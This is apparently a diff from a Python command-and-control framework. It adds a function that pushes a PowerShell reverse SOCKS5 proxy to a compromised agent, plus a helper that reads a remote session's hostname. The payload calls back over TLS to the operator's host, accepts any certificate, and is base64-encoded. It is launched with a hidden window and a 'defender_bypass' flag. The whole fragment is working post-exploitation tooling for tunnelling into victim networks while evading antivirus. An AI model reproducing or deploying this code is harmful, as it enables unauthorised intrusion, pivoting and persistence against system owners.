+	  2) Local SOCKS5 server on proxy_port
+	  3) Push full PowerShell logic to agent in one script
+	"""
+	# start Python server
+	#print(f"HANLER PORT: {socks_port}")
+	#print(f"PROXY PORT: {local_port}")
+	#print(f"REMOTE PORT: {remote_port}")
+
+	c2_host=socket.gethostbyname(socket.gethostname())
+	_thread.start_new_thread(server, (socks_port, local_port))
+	print(brightgreen + f"[+] Reverse SOCKS handler on 0.0.0.0:{local_port}, SOCKS5 on 127.0.0.1:{socks_port}")
+
+	# full PowerShell payload in one triple-quoted string
+	ps_script = f"""
+
+[ScriptBlock]$SocksConnectionMgr = {{
+	param($vars)
+	$client = $vars.cliConnection
+	$cliStream = $vars.cliStream
+
+	try {{
+		$buffer = New-Object byte[] 2
+		$read = $cliStream.Read($buffer,0,2) | Out-Null
+	
+		$socksVer = $buffer[0]
+		$nMethods = $buffer[1]
+		$methods = New-Object byte[] $nMethods
+		$read = $cliStream.Read($methods,0,$nMethods) | Out-Null
+	
+		$cliStream.Write([byte[]](5,0),0,2)
+		
+		$hdr = New-Object byte[] 4
+		$read = $cliStream.Read($hdr,0,4) | Out-Null
+		
+		$cmd = $hdr[1]; $atyp = $hdr[3]
+
+		switch ($atyp) {{
+			1 {{
+				$ipBytes = New-Object byte[] 4
+				$read = $cliStream.Read($ipBytes, 0, 4)
+				if ($read -ne 4) {{ throw "Failed to read full IPv4 address (read $read bytes)" }}
+				$addr = ([System.Net.IPAddress]::New($ipBytes)).ToString()
+			}}
+			3 {{
+				$lenBuf = New-Object byte[] 1
+				$read = $cliStream.Read($lenBuf, 0, 1)
+				if ($read -ne 1) {{ throw "Failed to read domain length byte" }}
+				$len = $lenBuf[0]
+
+				$domainBuf = New-Object byte[] $len
+				$read = $cliStream.Read($domainBuf, 0, $len)
+				if ($read -ne $len) {{ throw "Failed to read full domain name (expected $len, got $read)" }}
+				$addr = [System.Text.Encoding]::ASCII.GetString($domainBuf)
+			}}
+			default {{
+				throw "Unsupported address type: $atyp"
+			}}
+			}}
+
+		$portBuf = New-Object byte[] 2
+		$read = $cliStream.Read($portBuf, 0, 2)
+		if ($read -ne 2) {{ throw "Failed to read full port bytes (read $read bytes)" }}
+		$port = $portBuf[0] * 256 + $portBuf[1]
+		
+		$server = New-Object Net.Sockets.TcpClient($addr,$port)
+		
+		$srvStream = $server.GetStream()
+
+		$copyToClient = {{
+			param($srvStreamLocal, $cliStreamLocal)
+
+			$runspace = [runspacefactory]::CreateRunspace()
+			$runspace.Open()
+
+			$ps = [powershell]::Create()
+			$ps.Runspace = $runspace
+
+			[void]$ps.AddScript({{
+				param($srvStreamLocal, $cliStreamLocal)
+
+				try {{
+					while ($true) {{
+						$b = New-Object byte[] 4096
+						$r = $srvStreamLocal.Read($b, 0, $b.Length)
+						if ($r -le 1) {{
+							break
+						}}
+
+						$hex = [BitConverter]::ToString($b, 0, $r)
+						$ascii = ([System.Text.Encoding]::ASCII.GetString($b, 0, $r))
+
+						$cliStreamLocal.Write($b, 0, $r)
+						$cliStreamLocal.Flush()
+					}}
+				}} catch {{
+				}}
+
+			}}).AddArgument($srvStreamLocal).AddArgument($cliStreamLocal)
+
+			[void]$ps.BeginInvoke()
+		}}
+
+		$reply = [byte[]](5,0,0,1) + [byte[]]([System.Net.IPAddress]::Parse("0.0.0.0").GetAddressBytes()) + [byte[]](0,0)
+
+		$cliStream.Write($reply,0,$reply.Length)
+		Start-Sleep -Milliseconds 100
+
+		$copyToClient.Invoke($srvStream, $cliStream)
+
+		try {{
+			while ($true) {{
+				$b = New-Object byte[] 4096
+				try {{
+					$r = $cliStream.Read($b, 0, $b.Length)
+				}} catch {{
+					break
+				}}
+				if ($r -le 1) {{
+					break 
+				}}
+
+				$hexDump = [BitConverter]::ToString($b, 0, $r)
+				$asciiPreview = ([System.Text.Encoding]::ASCII.GetString($b, 0, $r))
+
+				try {{
+					$srvStream.Write($b, 0, $r)
+					$srvStream.Flush()
+				}} catch {{
+					break
+				}}
+			}}
+		}} catch {{  }}
+
+	}} catch {{
+	
+	}} finally {{
+		$client.Dispose(); $server.Dispose()
+	}}
+}}
+
+function Invoke-ReverseSocksProxy {{
+	param(
+		[String]$remoteHost = "{local_host}",
+		[Int]$remotePort = {local_port},
+		[Int]$socksPort = {socks_port}
+	)
+
+	while ($true) {{
+		$client = New-Object Net.Sockets.TcpClient($remoteHost,$remotePort)
+		$ns = $client.GetStream()
+		$callback = [System.Net.Security.RemoteCertificateValidationCallback]{{
+			Param($sender, $certificate, $chain, $sslPolicyErrors)
+			Write-Host "[*] PS: In certificate validation callback"
+			Write-Host "[*] PS: sslPolicyErrors = $sslPolicyErrors"
+			return $true
+		}}
+
+		$ssl = New-Object System.Net.Security.SslStream($ns,$false, $callback)
+		$ssl.AuthenticateAsClient($remoteHost)
+		
+		$req = [Text.Encoding]::ASCII.GetBytes("CONNECT / HTTP/1.1`nHost: $remoteHost`n`n")
+		$ssl.Write($req,0,$req.Length)
+		$buffer = New-Object byte[] 32; $ssl.Read($buffer,0,32) | Out-Null
+		
+		while ($true) {{
+			$helloBuf = New-Object byte[] 5
+			$count    = $ssl.Read($helloBuf, 0, 5)
+			$hello    = [System.Text.Encoding]::ASCII.GetString($helloBuf, 0, $count)
+			if ($hello -eq 'HELLO') {{
+				break
+			}}
+			Start-Sleep -Milliseconds 100
+		}}
+		# local listener
+		$vars = @{{ cliConnection = $ssl; cliStream = $ssl }}
+		Start-Sleep -Milliseconds 200
+		$PS = [PowerShell]::Create().AddScript($SocksConnectionMgr).AddArgument((New-Object PSObject -Property $vars))
+		$PS.BeginInvoke()
+	}}
+	
+}}
+
+Invoke-ReverseSocksProxy
+
+Write-Host "SOCKS proxy running in background runspace."
+"""
+
+	# encode and execute
+	b64 = base64.b64encode(ps_script.encode('utf-16le')).decode()
+	ps_cmd = (
+		f"$ps = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\"{b64}\")); "
+		"Invoke-Expression $ps'"
+	)
+
+	ps_cmd = base64.b64encode(ps_cmd.encode('utf-16le')).decode()
+	
+
+	ps_cmd = (
+		f"Start-Process powershell.exe -ArgumentList \"-NoProfile\",\"-EncodedCommand\",{b64} "
+		"-WindowStyle Hidden"
+		)
+	
+	session = session_manager.sessions[sid]
+	transport = session.transport.lower()
+
+	if transport in ('tcp', 'tls'):
+		shell.run_command_tcp(sid, ps_cmd, timeout=5, defender_bypass=True)
+
+	elif transport in ('http', 'https'):
+		shell.run_command_http(sid, ps_cmd, defender_bypass=True, output=False)
+	else:
+		print(brightred + "Unsupported transport for socks_proxy")
+
+	#print(brightgreen + f"[+] Agent listening on 0.0.0.0:{remote_port} via proxy {local_port}")
+
+
+def hostname(sid, os_type):
+	"""
+	Display the remote host's hostname.
+	"""
+	# resolve display alias
+
+	if os_type not in ("windows", "linux"):
+		return brightred + "[!] Unsupported operating system on agent!"
+
+	display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
+	cmd = "hostname"
+
+	sess = session_manager.sessions.get(sid)
+	if not sess:
+		return brightred + f"[!] No such session: {display}"
+
+	transport = sess.transport.lower()
+	if transport in ("http", "https"):
+		out = shell.run_command_http(sid, cmd)
+	
+	elif transport in ("tcp", "tls"):
+		out =  shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True)
+
+	else:
+		return brightred + "[!] Unknown session transport!"
+
+	if out:
+		return out
